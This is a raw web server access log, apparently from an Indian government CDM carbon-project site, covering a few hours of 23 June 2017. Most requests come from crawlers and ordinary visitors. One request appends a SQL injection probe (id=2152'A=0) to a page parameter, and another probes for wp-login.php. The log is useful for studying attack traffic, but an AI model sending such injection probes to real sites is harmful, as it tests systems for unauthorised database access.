5.228.20.199 - - [23/Jun/2017:03:32:22 +0530] "GET /project_details_view.php?id=646 HTTP/1.1" 200 14902 "http://yandex.ru/clck/jsredir?from=yandex.ru%3Bsearch%3Bweb%3B%3B&text=&etext=1460.aSAEjK_egG4KRvWBIOIa7UTikPx8Z6iSa55-GNs539rGpOTDiqad-y_uamyNYQrP.30c74ab30a71a9760398a89a38e1540830075075&uuid=&state=_BLhILn4SxNIvvL0W45KSic66uCIg23qh8iRG98qeIXmeppkgUc0YMIVJNtoWDTa6Ctl47TPu5I&data=UlNrNmk5WktYejR0eWJFYk1LdmtxdW5FZWJMbGt2ZHlWWjFSa2NYZ0JXNjI1ODVMdGQ1bmJxWlFHNHpDemp5b0t0a3pjTHZmTXZTb2ttTDNHZVYwc19UeTBlbnJjTEp2S0dWSF95MEZuUDJHUWZNTlRSRFcxZ1o1WndXVVgySFluMU1mOGg2NG83TG9OT3pidDN0SXFB&b64e=2&sign=28430fdd831493fa7331479176b0a292&keyno=0&cst=AiuY0DBWFJ7IXge4WdYJQYpgPUyh7uQlqxBCVb1CCozg-yMfwdvkJVGy85O1FMEh_2lJR-T9_wDTqqFi3y_FXXC-jtVO7Z86CCi_4cw_MA3n54FFE0zF-txGFugUe195khBZtoaYsZ-59AI3kd7Kz99chu5nXhWo&ref=orjY4mGPRjk5boDnW0uvlrrd71vZw9kp5uQozpMtKCVLVIUOk4qiEJqvJC3ZovTcK5rnWmaIj6pa8tgE26WPv3sBsqS_N0rNggwQgAXudZUF_i6y3EkB-k5Ey2P1VQTb&l10n=ru&cts=1498168134984&mc=2.9291943349" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
5.228.20.199 - - [23/Jun/2017:03:32:23 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=646" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
5.228.20.199 - - [23/Jun/2017:03:32:23 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=646" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
5.228.20.199 - - [23/Jun/2017:03:32:23 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=646" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
66.249.79.15 - - [23/Jun/2017:03:32:48 +0530] "GET /project_details_view.php?id=1421 HTTP/1.1" 200 14565 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.70.220.184 - - [23/Jun/2017:03:32:59 +0530] "GET /project_details_view.php?id=340 HTTP/1.1" 200 14633 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:32:59 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:32:59 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:32:59 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:00 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
216.70.220.184 - - [23/Jun/2017:03:33:01 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36"
40.77.167.35 - - [23/Jun/2017:03:35:01 +0530] "GET /project_details_view.php?id=1190 HTTP/1.1" 200 15466 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:03:35:39 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
157.55.39.174 - - [23/Jun/2017:03:36:30 +0530] "GET /project_details_view.php?id=1198 HTTP/1.1" 200 15423 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.54.159 - - [23/Jun/2017:03:37:08 +0530] "GET /project_details_view.php?id=1690 HTTP/1.1" 200 14481 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.19 - - [23/Jun/2017:03:37:48 +0530] "GET /project_details_view.php?id=1928 HTTP/1.1" 200 14054 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.81 - - [23/Jun/2017:03:37:48 +0530] "GET /project_details_view.php?id=1928 HTTP/1.1" 200 14054 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.174 - - [23/Jun/2017:03:39:09 +0530] "GET /project_details_view.php?id=1820 HTTP/1.1" 200 16791 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.81 - - [23/Jun/2017:03:41:46 +0530] "GET /project_details_view.php?id=566 HTTP/1.1" 200 14277 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:03:42:57 +0530] "GET /project_details_view.php?id=2044 HTTP/1.1" 200 15741 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.182.140.213 - - [23/Jun/2017:03:44:03 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; +http://www.komodia.com/newwiki/index.php/URL_server_crawler) KomodiaBot/1.0"
207.182.140.210 - - [23/Jun/2017:03:47:40 +0530] "GET / HTTP/1.1" 200 19480 "-" "M"
207.182.140.210 - - [23/Jun/2017:03:47:45 +0530] "GET / HTTP/1.1" 200 19480 "-" "M"
157.55.39.174 - - [23/Jun/2017:03:48:33 +0530] "GET /project_details_view.php?id=650 HTTP/1.1" 200 14184 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.27 - - [23/Jun/2017:03:49:14 +0530] "GET /project_details_view_report.php?id=16 HTTP/1.1" 200 13106 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:03:50:30 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:03:52:13 +0530] "GET / HTTP/1.1" 200 19480 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [23/Jun/2017:03:58:08 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:03:58:17 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
202.46.56.69 - - [23/Jun/2017:03:58:36 +0530] "GET /project_details_view.php?id=590 HTTP/1.1" 200 14579 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
146.148.64.128 - - [23/Jun/2017:03:58:59 +0530] "GET /news_more.php HTTP/1.1" 200 21061 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:03:59:26 +0530] "GET /sitemap.php HTTP/1.1" 200 18469 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:03:59:50 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "ltx71 - (http://ltx71.com/)"
199.30.25.102 - - [23/Jun/2017:04:01:20 +0530] "GET /js/datepicker/calendar.gif HTTP/1.1" 200 235 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
146.148.64.128 - - [23/Jun/2017:04:02:01 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [23/Jun/2017:04:03:18 +0530] "GET /project_details_view.php?id=51 HTTP/1.1" 200 14887 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:04:03:36 +0530] "GET /aboutus.php HTTP/1.1" 200 19597 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:04:05:24 +0530] "GET /registration.php HTTP/1.1" 302 28529 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:04:06:56 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:04:07:06 +0530] "GET /contactus.php HTTP/1.1" 200 18292 "-" "ltx71 - (http://ltx71.com/)"
207.46.13.27 - - [23/Jun/2017:04:11:23 +0530] "GET /project_details_view.php?id=660 HTTP/1.1" 200 13961 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
162.252.169.100 - - [23/Jun/2017:04:12:55 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
162.252.169.100 - - [23/Jun/2017:04:13:04 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.79.17 - - [23/Jun/2017:04:13:28 +0530] "GET /project_details_view.php?id=1503 HTTP/1.1" 200 15124 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:04:15:32 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:04:17:26 +0530] "GET /capacity_building.php HTTP/1.1" 200 19186 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.17 - - [23/Jun/2017:04:18:28 +0530] "GET /project_details_view_report.php?id=1781 HTTP/1.1" 200 13174 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.57.29 - - [23/Jun/2017:04:20:03 +0530] "GET /project_details_view.php?id=1942 HTTP/1.1" 200 14349 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.17 - - [23/Jun/2017:04:23:27 +0530] "GET /project_details_view.php?id=661 HTTP/1.1" 200 14097 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [23/Jun/2017:04:23:31 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=208 HTTP/1.1" 200 22246 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.79 - - [23/Jun/2017:04:25:50 +0530] "GET /project_details_view_report.php?id=1524 HTTP/1.1" 200 13193 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:04:26:25 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
157.55.39.174 - - [23/Jun/2017:04:26:50 +0530] "GET /project_details_view.php?id=1258 HTTP/1.1" 200 14032 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.81 - - [23/Jun/2017:04:28:05 +0530] "GET /downloads/New%20PCN.doc HTTP/1.1" 200 435200 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:04:33:48 +0530] "GET /project_details_view.php?id=1000&oid=&page=58&reporttype= HTTP/1.1" 200 15751 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.27 - - [23/Jun/2017:04:34:15 +0530] "GET /constitution.php HTTP/1.1" 200 23669 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:04:35:37 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
40.77.167.35 - - [23/Jun/2017:04:36:46 +0530] "GET /images/h_cons.jpg HTTP/1.1" 200 21924 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:04:38:23 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
202.46.56.191 - - [23/Jun/2017:04:41:31 +0530] "GET /project_details_view.php?id=546 HTTP/1.1" 200 14594 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.19 - - [23/Jun/2017:04:44:00 +0530] "GET /reports_list_details.php?id=Maharashtra&reporttype=2&page=10 HTTP/1.1" 200 22226 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.27 - - [23/Jun/2017:04:44:13 +0530] "GET /downloads/Template_sharing%202Percent.doc HTTP/1.1" 200 73728 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:04:44:30 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
35.184.189.105 - - [23/Jun/2017:04:47:10 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.19 - - [23/Jun/2017:04:49:08 +0530] "GET /project_details_view.php?id=1947 HTTP/1.1" 200 14249 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:04:54:08 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:04:54:26 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.19 - - [23/Jun/2017:04:59:20 +0530] "GET /project_details_view.php?id=657 HTTP/1.1" 200 14178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.183.121.102 - - [23/Jun/2017:05:02:29 +0530] "GET /project_details_view.php?id=2152'A=0 HTTP/1.1" 200 11450 "http://www.cdmindia.gov.in/project_details_view.php?id=2152'A=0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
202.46.51.88 - - [23/Jun/2017:05:02:59 +0530] "GET /project_details_view.php?id=2149&oid=1&page=1&reporttype=1 HTTP/1.1" 200 13617 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.17 - - [23/Jun/2017:05:04:18 +0530] "GET /project_details_view.php?id=547 HTTP/1.1" 200 14408 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.174 - - [23/Jun/2017:05:04:37 +0530] "GET /project_details_view.php?id=1229 HTTP/1.1" 200 15212 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:05:06:47 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
207.46.13.27 - - [23/Jun/2017:05:06:59 +0530] "GET /detail_events.php?id= HTTP/1.1" 302 16738 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.27 - - [23/Jun/2017:05:07:00 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.27 - - [23/Jun/2017:05:07:01 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [23/Jun/2017:05:09:09 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.19 - - [23/Jun/2017:05:09:17 +0530] "GET /project_details_view_report.php?id=1151 HTTP/1.1" 200 13216 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:05:09:28 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [23/Jun/2017:05:14:06 +0530] "GET /js/datepicker/latest_demo.css HTTP/1.1" 200 574 "http://www.cdmindia.gov.in/approved_projects.php?n=1" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.19 - - [23/Jun/2017:05:14:07 +0530] "GET /js/datepicker/latest_datepicker.css HTTP/1.1" 200 2283 "http://www.cdmindia.gov.in/approved_projects.php?n=1" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:05:14:28 +0530] "GET /project_details_view.php?id=972&oid=1&page=36&reporttype=1 HTTP/1.1" 200 15005 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.174 - - [23/Jun/2017:05:15:04 +0530] "GET /project_details_view.php?id=1547 HTTP/1.1" 200 13905 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.248 - - [23/Jun/2017:05:15:19 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
146.148.64.128 - - [23/Jun/2017:05:15:48 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
157.55.39.174 - - [23/Jun/2017:05:16:29 +0530] "GET /project_details_view.php?id=117 HTTP/1.1" 200 14178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:05:19:38 +0530] "GET /project_details_view_report.php?id=1184 HTTP/1.1" 200 13206 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [23/Jun/2017:05:21:06 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
207.46.13.27 - - [23/Jun/2017:05:23:18 +0530] "GET /project_details_view.php?id=1133&oid=3&page=5&reporttype=1 HTTP/1.1" 200 14585 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.52.73 - - [23/Jun/2017:05:24:26 +0530] "GET /project_details_view_report.php?id=60 HTTP/1.1" 200 13079 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.15 - - [23/Jun/2017:05:24:37 +0530] "GET /project_details_view.php?id=159&oid=1&page=85&reporttype=1 HTTP/1.1" 200 14641 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:05:26:10 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
207.46.13.27 - - [23/Jun/2017:05:26:38 +0530] "GET /imp_links.php HTTP/1.1" 200 17834 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.81 - - [23/Jun/2017:05:26:44 +0530] "GET /project_details_view.php?id=949 HTTP/1.1" 200 15971 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.174 - - [23/Jun/2017:05:26:47 +0530] "GET /contactus.php HTTP/1.1" 200 18292 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [23/Jun/2017:05:27:03 +0530] "GET /images/h_contactus.jpg HTTP/1.1" 200 21787 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:05:27:00 +0530] "GET /downloads/New%20PCN.doc HTTP/1.1" 200 435200 "-" "ltx71 - (http://ltx71.com/)"
40.77.167.35 - - [23/Jun/2017:05:27:14 +0530] "GET /news_more.php HTTP/1.1" 200 21061 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.81 - - [23/Jun/2017:05:27:33 +0530] "GET /images/h_news.jpg HTTP/1.1" 200 21315 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:05:29:48 +0530] "GET /project_details_view_report.php?id=1806 HTTP/1.1" 200 13239 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.27 - - [23/Jun/2017:05:34:02 +0530] "GET /constitution.php HTTP/1.1" 200 23669 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.102.6.111 - - [23/Jun/2017:05:34:09 +0530] "GET /project_details_view.php?id=889 HTTP/1.1" 200 14454 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:05:34:10 +0530] "GET /project_details_view.php?id=889 HTTP/1.1" 200 14454 "-" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
